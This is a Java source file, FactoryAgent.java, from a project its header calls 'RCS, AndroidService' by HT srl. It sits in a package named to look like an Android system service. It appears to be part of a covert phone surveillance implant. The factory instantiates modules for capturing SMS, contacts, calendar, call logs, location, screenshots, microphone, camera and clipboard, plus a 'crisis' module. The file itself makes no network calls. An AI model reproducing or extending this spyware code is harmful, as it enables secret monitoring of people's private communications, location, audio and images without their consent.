/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module;

import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.AbstractFactory;
import com.android.service.util.Check;

public class FactoryAgent implements AbstractFactory<BaseModule, String> {
	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public BaseModule create(String type, String subtype) {
		BaseModule a = null;

		if ("sms".equals(type)) {
			a = new ModuleMessage();
		} else if ("addressbook".equals(type)) {
			a = new ModuleAddressBook();
		} else if ("calendar".equals(type)) {
			a = new ModuleCalendar();
		} else if ("calllist".equals(type) || "call".equals(type)) { // Alias
																		// per
																		// la
																		// 8.0
			if (Status.calllistCreated == false) {
				a = new ModuleCallList();
				Status.calllistCreated = true;
			}
		} else if ("device".equals(type)) {
			a = new ModuleDevice();
		} else if ("position".equals(type)) {
			a = new ModulePosition();
		} else if ("snapshot".equals(type) || "screenshot".equals(type)) { // 7.6
																			// ->
																			// 8.0
			a = new ModuleSnapshot();
		} else if ("messages".equals(type)) {
			a = new ModuleMessage();
		} else if ("mic".equals(type)) {
			a = new ModuleMic();
		} else if ("camera".equals(type)) {
			a = new ModuleCamera();
		} else if ("clipboard".equals(type)) {
			a = new ModuleClipboard();
		} else if ("crisis".equals(type)) {
			a = new ModuleCrisis();
		} else if ("application".equals(type)) {
			a = new ModuleApplication();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (factory), unknown type: " + type);//$NON-NLS-1$
			}
		}

		return a;
	}
}
